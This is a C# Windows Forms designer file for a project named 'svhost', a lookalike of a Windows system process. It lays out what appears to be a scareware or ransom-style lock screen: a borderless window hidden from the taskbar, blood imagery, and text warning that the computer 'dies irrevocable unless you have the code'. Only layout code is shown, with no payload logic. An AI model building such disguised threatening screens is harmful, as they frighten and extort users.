
namespace svhost
{
    partial class okno
    {
        /// <summary>
        /// Required designer variable.
        /// </summary>
        private System.ComponentModel.IContainer components = null;

        /// <summary>
        /// Clean up any resources being used.
        /// </summary>
        /// <param name="disposing">true if managed resources should be disposed; otherwise, false.</param>
        protected override void Dispose(bool disposing)
        {
            if (disposing && (components != null))
            {
                components.Dispose();
            }
            base.Dispose(disposing);
        }

        #region Windows Form Designer generated code

        /// <summary>
        /// Required method for Designer support - do not modify
        /// the contents of this method with the code editor.
        /// </summary>
        private void InitializeComponent()
        {
            this.components = new System.ComponentModel.Container();
            this.timer1 = new System.Windows.Forms.Timer(this.components);
            this.Nam = new System.Windows.Forms.Label();
            this.label1 = new System.Windows.Forms.Label();
            this.label2 = new System.Windows.Forms.Label();
            this.label3 = new System.Windows.Forms.Label();
            this.hp = new System.Windows.Forms.Label();
            this.timer2 = new System.Windows.Forms.Timer(this.components);
            this.blood = new System.Windows.Forms.PictureBox();
            ((System.ComponentModel.ISupportInitialize)(this.blood)).BeginInit();
            this.SuspendLayout();
            // 
            // timer1
            // 
            this.timer1.Enabled = true;
            this.timer1.Interval = 200;
            this.timer1.Tick += new System.EventHandler(this.TickOk);
            // 
            // Nam
            // 
            this.Nam.AutoSize = true;
            this.Nam.Font = new System.Drawing.Font("Segoe Print", 36F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(238)));
            this.Nam.Location = new System.Drawing.Point(541, 9);
            this.Nam.Name = "Nam";
            this.Nam.Size = new System.Drawing.Size(240, 85);
            this.Nam.TabIndex = 0;
            this.Nam.Text = "I looking";
            this.Nam.UseWaitCursor = true;
            this.Nam.Click += new System.EventHandler(this.Nam_Click);
            // 
            // label1
            // 
            this.label1.AutoSize = true;
            this.label1.Font = new System.Drawing.Font("Segoe Print", 20.25F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(238)));
            this.label1.Location = new System.Drawing.Point(30, 100);
            this.label1.Name = "label1";
            this.label1.Size = new System.Drawing.Size(491, 47);
            this.label1.TabIndex = 1;
            this.label1.Text = "what happened to my computer? ";
            this.label1.UseWaitCursor = true;
            // 
            // label2
            // 
            this.label2.AutoSize = true;
            this.label2.Font = new System.Drawing.Font("Segoe Print", 20.25F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(238)));
            this.label2.Location = new System.Drawing.Point(30, 171);
            this.label2.Name = "label2";
            this.label2.Size = new System.Drawing.Size(629, 47);
            this.label2.TabIndex = 2;
            this.label2.Text = "It dies irrevocable unless you have the code: ";
            this.label2.UseWaitCursor = true;
            // 
            // label3
            // 
            this.label3.AutoSize = true;
            this.label3.Font = new System.Drawing.Font("Segoe Print", 20.25F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(238)));
            this.label3.Location = new System.Drawing.Point(30, 278);
            this.label3.Name = "label3";
            this.label3.Size = new System.Drawing.Size(388, 47);
            this.label3.TabIndex = 3;
            this.label3.Text = "The life of your computer :";
            this.label3.UseWaitCursor = true;
            // 
            // hp
            // 
            this.hp.AutoSize = true;
            this.hp.Font = new System.Drawing.Font("Segoe Print", 20.25F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(238)));
            this.hp.Location = new System.Drawing.Point(448, 278);
            this.hp.Name = "hp";
            this.hp.Size = new System.Drawing.Size(100, 47);
            this.hp.TabIndex = 4;
            this.hp.Text = "100%";
            this.hp.UseWaitCursor = true;
            this.hp.Click += new System.EventHandler(this.hp_Click);
            // 
            // timer2
            // 
            this.timer2.Enabled = true;
            this.timer2.Interval = 200;
            this.timer2.Tick += new System.EventHandler(this.Timer2tick);
            // 
            // blood
            // 
            this.blood.Image = global::svhost.Properties.Resources.kisspng_blood_residue_blood_spatter_5a9b5b05205cd9_3927240215201308211326;
            this.blood.Location = new System.Drawing.Point(66, 496);
            this.blood.Name = "blood";
            this.blood.Size = new System.Drawing.Size(204, 111);
            this.blood.SizeMode = System.Windows.Forms.PictureBoxSizeMode.StretchImage;
            this.blood.TabIndex = 5;
            this.blood.TabStop = false;
            this.blood.UseWaitCursor = true;
            // 
            // okno
            // 
            this.AutoScaleDimensions = new System.Drawing.SizeF(6F, 13F);
            this.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
            this.BackColor = System.Drawing.Color.Maroon;
            this.BackgroundImageLayout = System.Windows.Forms.ImageLayout.Stretch;
            this.ClientSize = new System.Drawing.Size(1280, 571);
            this.Controls.Add(this.Nam);
            this.Controls.Add(this.blood);
            this.Controls.Add(this.hp);
            this.Controls.Add(this.label3);
            this.Controls.Add(this.label2);
            this.Controls.Add(this.label1);
            this.Cursor = System.Windows.Forms.Cursors.WaitCursor;
            this.ForeColor = System.Drawing.Color.Cyan;
            this.FormBorderStyle = System.Windows.Forms.FormBorderStyle.None;
            this.Name = "okno";
            this.ShowIcon = false;
            this.ShowInTaskbar = false;
            this.StartPosition = System.Windows.Forms.FormStartPosition.CenterScreen;
            this.Text = "I see";
            this.UseWaitCursor = true;
            ((System.ComponentModel.ISupportInitialize)(this.blood)).EndInit();
            this.ResumeLayout(false);
            this.PerformLayout();

        }

        #endregion

        private System.Windows.Forms.Timer timer1;
        private System.Windows.Forms.Label Nam;
        private System.Windows.Forms.Label label1;
        private System.Windows.Forms.Label label2;
        private System.Windows.Forms.Label label3;
        private System.Windows.Forms.Label hp;
        private System.Windows.Forms.Timer timer2;
        private System.Windows.Forms.PictureBox blood;
    }
}

